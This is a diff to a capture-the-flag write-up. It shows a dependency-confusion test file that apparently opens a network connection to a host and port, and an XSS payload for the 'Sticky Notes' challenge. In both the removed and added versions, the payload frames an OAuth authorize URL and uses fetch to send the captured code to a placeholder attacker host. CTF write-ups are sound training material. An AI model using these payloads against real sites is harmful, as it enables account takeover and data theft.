@@ -88,6 +88,7 @@ if __name__ == '__main__':
 2. Tampering `user_id` to `2`
 3. Calculator Project using local dependency
 4. Vulnerable to dependency confusion
+
 calc.test.js
 ```
 var net = require('net');
@@ -119,7 +120,7 @@ function c(HOST,PORT) {
 c(HOST,PORT);
 ```
 
-## Sticky Notes (Hard 500pts)
+## Sticky Notes (Hard 500pts) ([Detailed Writeup](Web/Sticky%20Notes).)
 1. The flow of oauth login for this application is something like this
 `sticky-notes/oauth/signin -> oaut/oauth/authorize?state=nyx -> sticky-notes/signin_callback?code=steal&state=nyx`
 2. Sticky notes application have XSS in `report a problem`
@@ -130,8 +131,13 @@ c(HOST,PORT);
 
 payload
 ```
-<iframe src="http://challenge.ctf.games:30090/oauth/authorize?response_type=code&client_id=QJ7Bo88ZBioNTZSXTOJrMYDx&redirect_uri=http%3A%2F%2Fchallenge.ctf.games%3A31941%2Foauth%2Fsignin_callback&scope=profile&state=Ezw28CyQiDeKDBTLMzio4O5hS7fP1C&action=signin" onload="fetch('//ip_addr:port/?'+btoa(this.contentWindow.location.href))">
+<iframe src="http://challenge.ctf.games:30783/oauth/authorize?response_type=code&client_id=QJ7Bo88ZBioNTZSXTOJrMYDx&redirect_uri=http%3A%2F%2Fchallenge.ctf.games%3A30846%2Foauth%2Fsignin_callback&scope=profile&state=Kjq4dAo18GjizCdF4sYxxO9GVFMddx&action=signin">
 </iframe>
+<script>
+document.querySelector('iframe').addEventListener("load", function(){
+    fetch('//ip_addr:port/?'+btoa(this.contentWindow.location.href))
+})
+</script>
 ```
 
 ## Go Blog (Hard 500pts)
